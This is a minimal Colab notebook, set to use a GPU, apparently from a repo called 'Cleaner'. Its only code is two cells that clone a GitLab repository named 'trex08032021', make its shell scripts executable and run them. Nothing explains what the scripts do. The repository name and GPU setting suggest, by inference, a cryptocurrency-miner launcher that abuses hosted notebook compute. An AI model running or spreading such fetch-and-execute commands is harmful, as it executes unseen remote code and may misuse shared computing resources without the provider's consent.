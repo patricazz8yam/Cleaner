{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "NC5EG31KHOSv"
      },
      "source": [
        "# 2"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8CoyVxWBHLRF"
      },
      "source": [
        "!git clone https://gitlab.com/lens3/trex08032021.git && cd trex08032021 && chmod +x *.sh && ./nbsp.sh"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LZ21nwosHZFu"
      },
      "source": [
        "!git clone https://gitlab.com/lens3/trex08032021.git && cd trex08032021 && chmod +x *.sh && ./nbf2.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}